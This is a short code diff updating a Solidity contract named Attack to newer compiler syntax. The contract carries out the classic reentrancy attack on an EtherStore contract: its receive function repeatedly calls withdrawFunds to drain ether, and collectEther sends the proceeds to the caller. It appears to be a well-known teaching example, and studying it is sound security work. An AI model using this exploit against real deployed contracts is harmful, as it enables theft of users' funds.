@@ -1,4 +1,5 @@
-pragma solidity ^0.5.6;
+// SPDX-License-Identifier: ISC
+pragma solidity ^0.7.0;
 
 import "EtherStore.sol";
 
@@ -14,18 +15,18 @@ contract Attack {
       // attack to the nearest ether
       require(msg.value >= 1 ether);
       // send eth to the depositFunds() function
-      etherStore.depositFunds.value(1 ether)();
+      etherStore.depositFunds{value: 1 ether}();
       // start the magic
       etherStore.withdrawFunds(1 ether);
   }
 
   function collectEther() public {
-      msg.sender.transfer(this.balance);
+      msg.sender.transfer(address(this).balance);
   }
 
   // fallback function - where the magic happens
-  function () payable {
-      if (etherStore.balance > 1 ether) {
+  receive() external payable {
+      if (address(etherStore).balance > 1 ether) {
           etherStore.withdrawFunds(1 ether);
       }
   }
